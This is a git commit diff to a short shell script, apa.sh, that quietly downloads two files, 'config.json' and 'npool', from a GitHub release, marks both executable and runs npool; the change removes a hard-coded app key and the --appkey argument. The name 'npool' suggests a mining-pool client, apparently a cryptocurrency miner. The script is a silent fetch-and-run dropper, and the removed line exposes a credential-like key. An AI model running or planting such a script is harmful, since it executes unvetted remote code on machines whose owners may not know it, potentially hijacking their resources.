0eefb11ab0ef6301eab1d86b6476a4c3e2c2759b
vedhagsvp <vedhag230223@gmail.com>
2026-02-11 23:56:18 +0530

    Update apa.sh

--- apa.sh
+++ apa.sh
@@ -1,9 +1,6 @@
 #!/bin/bash
-
-APP_KEY="wW8xBLMezohupvC7"
-
 wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/config.json
 wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/npool
 chmod +x config.json
 chmod +x npool
-./npool --appkey "$APP_KEY"
+./npool
